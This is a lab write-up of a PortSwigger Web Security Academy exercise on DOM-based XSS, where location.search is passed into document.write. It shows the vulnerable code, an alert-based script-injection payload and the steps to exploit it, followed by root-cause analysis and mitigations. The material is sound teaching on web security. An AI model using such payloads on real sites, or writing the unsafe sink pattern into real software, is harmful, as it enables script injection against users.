# 🚨 DOM XSS in `document.write` Sink using `location.search`

## 🧪 Lab Details

| Field | Value |
|---|---|
| **Lab Name** | DOM XSS in `document.write` sink using source `location.search` |
| **Difficulty** | Apprentice |
| **Platform** | PortSwigger Web Security Academy |
| **Category** | DOM-Based Cross-Site Scripting (DOM XSS) |

---

# 🎯 Goal

Perform a DOM-based XSS attack that executes JavaScript through the search functionality.

---

# 🧠 Vulnerability Overview

The application reads user-controlled input from:

```javascript
location.search
```

and directly writes it into the page using:

```javascript
document.write()
```

This creates a DOM XSS vulnerability because attacker-controlled data is inserted into the HTML without sanitization.

---

# 🔍 Source & Sink Analysis

| Component | Value |
|---|---|
| **Source** | `location.search` |
| **Sink** | `document.write()` |
| **Injection Point** | Search Parameter |
| **Execution Context** | HTML Attribute / HTML Body |

---

# ⚔️ Source

```javascript
location.search
```

User-controlled data is taken directly from the URL query string.

Example:

```url
https://vulnerable-site.com/?search=test
```

---

# 💥 Sink

```javascript
document.write()
```

The application dynamically injects the search term into the DOM.

Example vulnerable code:

```javascript
document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
```

---

# 💣 Payload

```html
"><script>alert("XSS")</script>
```

---

# ⚔️ Exploitation Steps

## 1️⃣ Open the Lab

Navigate to the vulnerable search page.

---

## 2️⃣ Locate the Search Functionality

The search term is reflected into the page using `document.write()`.

---

## 3️⃣ Inject the Payload

Use the following payload:

```html
"><script>alert("XSS")</script>
```

---

## 4️⃣ Break Out of the Existing HTML Context

The payload begins with:

```html
">
```

This closes the existing HTML attribute.

---

## 5️⃣ Inject Malicious JavaScript

The browser then parses:

```html
<script>alert("XSS")</script>
```

and executes the JavaScript.

---

# ✅ Result

```javascript
alert("XSS")
```

DOM XSS successfully triggered.

---

# 📊 Result Analysis

| Test | Status |
|---|---|
| User Input Controlled | ✅ |
| DOM Sink Vulnerable | ✅ |
| HTML Injection Successful | ✅ |
| JavaScript Execution | ✅ |

---

# 🧨 Why It Works

- User input from `location.search` is trusted
- Data is inserted directly into the DOM
- `document.write()` parses content as HTML
- No sanitization or encoding is applied

---

# 🔍 Root Cause

## ❌ Unsafe DOM Sink

The application uses:

```javascript
document.write()
```

which is dangerous with untrusted data.

---

## ❌ Missing Input Sanitization

Special characters such as:

```html
"
>
<
```

are not escaped before rendering.

---

## ❌ HTML Context Breakout

The payload escapes the existing HTML structure and injects executable JavaScript.

---

# 🛡️ Mitigation

## ✅ 1. Avoid Dangerous DOM Sinks

Do not use:

```javascript
document.write()
innerHTML
outerHTML
eval()
```

with untrusted input.

---

## ✅ 2. Use Safe DOM APIs

Prefer safer methods:

```javascript
element.textContent = userInput;
```

or

```javascript
element.innerText = userInput;
```

---

## ✅ 3. Create Elements Safely

Use DOM methods instead of raw HTML:

```javascript
const div = document.createElement("div");
div.textContent = userInput;
```

---

## ✅ 4. Encode User Input

Escape dangerous characters before rendering into HTML.

---

# 📚 Learning

This lab demonstrates how DOM XSS occurs when:

- User-controlled input is read from the URL
- Unsafe DOM sinks parse attacker input as HTML
- HTML context is breakable using quotes (`"`)

The attack happens entirely in the browser without server-side reflection.

---

# 🧰 Tools Used

- Burp Suite
- Browser DevTools
- PortSwigger Web Security Academy

---

# ⚠️ Disclaimer

This write-up is intended strictly for educational purposes.

All testing was performed on intentionally vulnerable lab environments.

---

# 💡 Key Takeaway

DOM XSS occurs when JavaScript trusts user-controlled data and inserts it into the DOM using unsafe methods like:

```javascript
document.write()
innerHTML
```

Always treat client-side input as untrusted.
